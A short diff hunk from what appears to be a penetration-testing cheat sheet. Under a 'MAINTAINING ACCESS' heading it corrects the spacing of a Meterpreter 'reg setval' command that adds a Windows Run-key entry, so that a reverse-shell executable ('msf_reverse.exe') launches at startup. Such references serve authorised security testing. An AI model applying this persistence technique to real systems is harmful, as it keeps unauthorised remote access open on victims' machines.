@@ -180,4 +180,4 @@ msf> use exploit/multi/handler // start listener with same options as above (sam
 
 MAINTAINING ACCESS
 
-reg setval  - k  HKLM \ \ software \ \ microsoft \ \ windows \ \ currentversion \ \ run   - d '"C: \ inetpub \ ftproot \ msf_ reverse .exe"'  - v msf_ reverse
+reg setval  - k  HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\inetpub\ftproot\msf_reverse.exe"' -v msf_reverse
